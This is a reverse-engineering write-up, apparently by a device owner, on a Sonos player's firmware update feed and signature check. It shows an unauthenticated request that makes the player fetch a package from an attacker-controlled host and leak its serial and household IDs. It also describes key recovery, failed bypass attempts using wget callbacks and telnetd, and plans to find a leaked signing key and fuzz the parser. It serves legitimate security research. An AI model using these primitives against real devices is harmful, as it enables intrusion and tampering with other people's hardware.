# Update feed and package signature gate (S1 57.23, 2026-10-22)

Owner-directed RE. This extends the live update-path probe in
[`FIRMWARE_PATHS.md`](FIRMWARE_PATHS.md) with the direct-package path and the
signature gate's internals. No device identifiers or keys are committed.

## Feed primitive

`ZoneGroupTopology.BeginSoftwareUpdate` is unauthenticated on the LAN and
fetches any URL given in `UpdateURL`:

```http
POST /ZoneGroupTopology/Control HTTP/1.1
SOAPACTION: "urn:schemas-upnp-org:service:ZoneGroupTopology:1#BeginSoftwareUpdate"

<u:BeginSoftwareUpdate>
  <Flags>0</Flags>
  <UpdateURL>http://<attacker-host>:8080/pkg.upd</UpdateURL>
</u:BeginSoftwareUpdate>
```

The player appends its own query string to that URL:

```
?cmaj=57&cmin=23&cbld=<build>&subm=<submodel>&rev=1&reg=1
 &serial=<serial>&sonosid=<id>&householdid=<household>
```

so an arbitrary LAN host receives the model/build, serial, Sonos ID and
household ID. A `.upm` manifest is parsed as XML; a direct `.upd` is fetched
whole (an official 5.6 MB package completes) and handed to the root
`upgrade` process. Parsing happens **before** signature verification, so
unsigned packages are a pre-auth, root-context parser surface.

Invalid packages cause a reboot after the attempt but are not installed.
A signed 34.16 image is fetched but does not stick (minimum-compatible
version gate).

## Package shape

An `.upd` is a sequence of sections at offset 0, each `magic 497f1635`,
`u32 type`, `u32 total_length`, `u32 flags`, then `total_length - 16` payload
bytes (all little-endian). Relevant types: 1 version header (`u32 cmaj`,
`u32 cmin`, `u32 build`), 3 preinstall script, 4 rootfs, 6 kernel, 21
capabilities, 22 signature.

Component payloads (3/4/6 and the signature) are encrypted with a
`886499ca` envelope:

```
magic | u32 header_len | u32 00010000 | 8 zero bytes
u8 recipient_len | u8 03 | recipient bytes
u32 cipher_id=1 | u32 rsa_len | RSA-OAEP(SHA-1) AES key
u32 cipher_id=1 | u32 data_len | 16-byte IV + AES-CBC ciphertext
```

`header_len = 0x14 + 2 + recipient_len + 8 + rsa_len + 8`. The recipient is
the model key family; model-16 keys are recoverable from a plaintext 34.16
updater, so arbitrary sections can be re-encrypted for the owner's ZPS5
players.

## Signature gate

After the sections are read, `upgrade` calls `ZZ0121` on the type-22 payload
and then `ZZ0124` to verify. `ZZ0121` is a custom TLV parser, not ASN.1:

- fixed struct `0x22c0`, exactly two certificate slots of `0x910` bytes;
- per slot: `u32 cert_len <= 0x7ff`, cert bytes, a type byte,
  `u32` field, `u32 key_len <= 0x100`, key bytes;
- slot content ends at `0x19b0`, so two maximal slots end exactly at
  `0x22c0`; the layout is correct, not an overflow;
- `ZZ0124` then verifies the package digest against the certificate.

An unsigned package does **not** run the type-3 preinstall, even when the
section is correctly encrypted to the model key and the package carries a
copied signature section. Confirmed with a `wget` callback and by starting
`telnetd` from the script. Not bypassed by:

- `Flags` 0..31 plus 256/4096/65536/2^31/2^32-1;
- `ExtraOptions` guesses (`bForceUpdate=1`, `force=1`, updater flags
  `-X`, `-Y`, `-n`, `-F`, `-f`, `-s`, combinations);
- keeping the old signature while modifying only the preinstall;
- a signed older package.

`/etc/upgradekey.pub` is a raw RSA-2048 public key (version header
`00040000`, modulus, exponent 65537), but the type-22 signature is 128
bytes, so the verifier key is separate (likely RSA-1024) and is not
`upgradekey.pub`.

## Rootfs repack (for when a signature exists)

The 57.23 kernel mounts **squashfs 3.0 only**; `mksquashfs` 4.x images do
not boot. `squashfs-tools` 3.4 builds on a modern glibc with:

```
CFLAGS="-I. -D_FILE_OFFSET_BITS=64 -D_LARGEFILE_SOURCE -D_GNU_SOURCE \
 -O2 -std=gnu89 -fgnu89-inline -fcommon -include sys/sysmacros.h"
make mksquashfs
```

Use `mksquashfs <dir> rootfs.bin -be -all-root -noappend -b 65536`, then
set the superblock minor byte at `0x1e` to 0 (3.1 → 3.0). A one-byte
`VERSION` edit survives and the image remains exactly the original
4,571,136 bytes. A patched image and package are kept locally under
`captures/firmware/`.

## Negative results

- Unsigned `.upm` manifests are fetched and parsed but never lead to an
  image fetch; the manifest signature is enforced.
- An unsigned `.upd` is fetched and parsed, then rejected; the reboot is
  unconditional, not a sign of installation.
- The kernel rejects squashfs 4.x; v3.0 is required.

## Next

1. Identify the 128-byte-signature verifier key (the `libsonoscrypto`
   `ZZ0124` path) and check whether it is shared, leaked, or derivable from
   the MDP2 key blob.
2. Fuzz `ZZ0121` and the section reader under a PPC emulator; both run
   before the gate.
3. With a valid signature, the patched v3 rootfs should install and expose a
   changed `/status/VERSION`.
